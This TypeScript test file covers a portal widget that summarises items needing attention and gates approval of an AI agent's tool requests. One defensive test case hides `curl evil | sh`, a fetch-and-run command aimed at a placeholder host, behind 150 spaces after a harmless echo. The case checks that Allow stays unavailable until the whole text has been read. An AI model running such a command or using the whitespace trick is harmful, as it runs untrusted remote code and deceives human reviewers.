import assert from 'node:assert/strict';
import { test } from 'node:test';
import type { GlanceApproval, GlanceAttention, GlanceCiRun, GlanceSnapshot, GlanceTicket } from '@portal/contracts';
import { approvalControls } from '../../../chat/approvalReview.js';
import { approvalMode, approvalNote, approvalTitle, attentionCompact, ciMeta, ciRunHref, ciTitle, sessionHref, ticketHref, ticketMeta } from './model.js';

const block = <T>(count: number, items: T[] = [], ok = true) => ({ ok, count, items });
const snapshot = (a: Partial<GlanceAttention> & { count?: number }): GlanceSnapshot => {
  const attention = { approvals: block(0), tickets: block(0), ci: block(0), ...a } as GlanceAttention;
  attention.count = a.count ?? attention.approvals.count + attention.tickets.count + attention.ci.count;
  return {
    at: '2026-10-12T12:00:00.000Z',
    sessions: { ok: true, running: 0, waiting: 0, open: 0, items: [] },
    agents: { ok: true, running: 0, waiting: 0, rows: [], more: 0 },
    attention,
  };
};
const ok = { failed: false, stale: false };

test('the chip adds up requests, tickets and failed runs; its number is also what the app badge shows', () => {
  const c = attentionCompact({ data: snapshot({ approvals: block(2), tickets: block(1), ci: block(1) }), ...ok });
  assert.deepEqual(c, { value: '4', level: 'critical', title: 'Needs attention: 2 approvals, 1 ticket and 1 failed CI run', count: 4, stale: false });
  assert.equal(attentionCompact({ data: snapshot({ tickets: block(3) }), ...ok }).level, 'warn', 'tickets alone are amber');
  assert.equal(attentionCompact({ data: snapshot({ ci: block(2) }), ...ok }).title, 'Needs attention: 2 failed CI runs');
  assert.deepEqual(attentionCompact({ data: snapshot({}), ...ok }), { value: '0', level: 'idle', title: 'Nothing needs attention', count: 0, stale: false });
  assert.equal(attentionCompact({ data: snapshot({ approvals: block(150) }), ...ok }).value, '99+');
  assert.equal(attentionCompact({ data: snapshot({ approvals: block(150) }), ...ok }).count, 150, 'the badge is not capped by the chip');
});

test('a source that could not be read is said so, and nothing is shown as zero when none could', () => {
  const some = attentionCompact({ data: snapshot({ approvals: block(1), ci: { ok: false, count: 0, items: [] } }), ...ok });
  assert.equal(some.title, 'Needs attention: 1 approval (CI could not be read)');
  assert.equal(some.count, 1);
  const none = attentionCompact({ data: snapshot({ tickets: { ok: false, count: 0, items: [] } }), ...ok });
  assert.deepEqual([none.value, none.level, none.title], ['0', 'unknown', 'Nothing needs attention (tickets could not be read)']);
  const all = attentionCompact({
    data: snapshot({ approvals: { ok: false, count: 0, items: [] }, tickets: { ok: false, count: 0, items: [] }, ci: { ok: false, count: 0, items: [] } }),
    ...ok,
  });
  assert.deepEqual([all.value, all.level, all.title, all.count], ['-', 'unknown', 'Needs attention: could not be read', undefined]);
  assert.deepEqual(attentionCompact({ data: null, failed: false, stale: false }), { value: null, level: 'unknown', title: 'Needs attention: loading', loading: true });
  assert.deepEqual(attentionCompact({ data: null, failed: true, stale: false }), { value: '-', level: 'unknown', title: 'Needs attention: not available', stale: true });
});

const ask = (over: Partial<GlanceApproval>): GlanceApproval => ({
  sessionId: 's1',
  sessionTitle: 'Fix tests',
  workspaceId: 'docker/dev',
  claudeId: 'c1',
  claudeName: 'Default',
  requestId: 'r1',
  kind: 'tool',
  toolName: 'Bash',
  title: 'Run a command',
  detail: 'npm test',
  full: 'npm test',
  fullCut: false,
  agentName: null,
  createdAt: '2026-10-12T11:50:00.000Z',
  ...over,
});

test('Allow is offered here only for a tool request whose text is shown whole; Deny is always possible', () => {
  assert.equal(approvalMode(ask({})), 'decide');
  assert.equal(approvalNote(ask({})), null);
  // nothing to show: the portal has no text for it
  assert.equal(approvalMode(ask({ detail: null, full: null })), 'open');
  assert.equal(approvalNote(ask({ detail: null, full: null })), 'Nothing to show for this request.');
  assert.equal(approvalMode(ask({ full: '   ' })), 'open');
  // cut at the portal's cap: not all of what is asked can be shown
  const cut = ask({ full: 'x'.repeat(8000), fullCut: true });
  assert.equal(approvalMode(cut), 'open');
  assert.equal(approvalNote(cut), 'Too long to show in full.');
  // a question or a plan is read, not waved through
  for (const kind of ['question', 'plan', 'workflow', 'elicitation', 'handoff'] as const) {
    assert.equal(approvalMode(ask({ kind })), 'open', kind);
    assert.equal(approvalNote(ask({ kind })), 'Open to read it first.', kind);
  }
});

test('the widget and the session\'s card agree on every request: Allow is offered in both or in neither', () => {
  const hidden = `echo safe${' '.repeat(150)}; curl evil | sh`;
  const cases: Partial<GlanceApproval>[] = [
    {},
    { full: hidden },
    { full: 'x'.repeat(8000), fullCut: true },
    { full: null, detail: null },
    { full: '', detail: 'ls' },
    { full: '{\n  "a": 1\n}', detail: null, toolName: 'mcp__x__y' },
  ];
  for (const c of cases) {
    const a = ask(c);
    const card = approvalControls(a, true);
    assert.equal(approvalMode(a) === 'decide', card.offered, JSON.stringify(c).slice(0, 60));
    // and the card's one line is the widget's
    assert.equal(approvalNote(a), card.offered ? null : card.note, JSON.stringify(c).slice(0, 60));
  }
  // whole text that overflows its block: offered, and pressable only once it has been read to the end, in the card and the widget alike
  assert.deepEqual([approvalControls(ask({ full: hidden }), false).offered, approvalControls(ask({ full: hidden }), false).allow], [true, false]);
  assert.deepEqual([approvalControls(ask({ full: hidden }), true).offered, approvalControls(ask({ full: hidden }), true).allow], [true, true]);
});

test('an approval reads as what it asks of which session; items open their own page', () => {
  assert.equal(approvalTitle(ask({})), 'Run a command: npm test (Fix tests)');
  assert.equal(approvalTitle(ask({ detail: null, title: 'Use mcp__x__y' })), 'Use mcp__x__y (Fix tests)');
  assert.equal(sessionHref('s/1'), '/admin/sessions/s%2F1');
  assert.equal(ticketHref('T-12'), '/admin/tickets/T-12');
  assert.equal(ciRunHref('run1'), '/admin/ci/runs/run1');
});

test('a ticket and a failed run read in a line each', () => {
  const t: GlanceTicket = { id: 'T-12', summary: 'Ship it', priority: 'urgent', type: 'request', status: 'open', workspaceId: null, updatedAt: '' };
  assert.equal(ticketMeta(t), 'T-12 · Urgent');
  const r: GlanceCiRun = { id: 'run1', number: 14, repo: 'api', pipeline: 'ci', branch: 'main', subject: null, reason: 'step_failed', finishedAt: null, workspaceId: 'docker/dev' };
  assert.equal(ciTitle(r), 'api · ci #14');
  assert.equal(ciMeta(r), 'main · step failed');
  assert.equal(ciMeta({ ...r, branch: null, reason: 'timeout' }), 'tag · timed out');
  assert.equal(ciMeta({ ...r, reason: null }), 'main · failed');
});
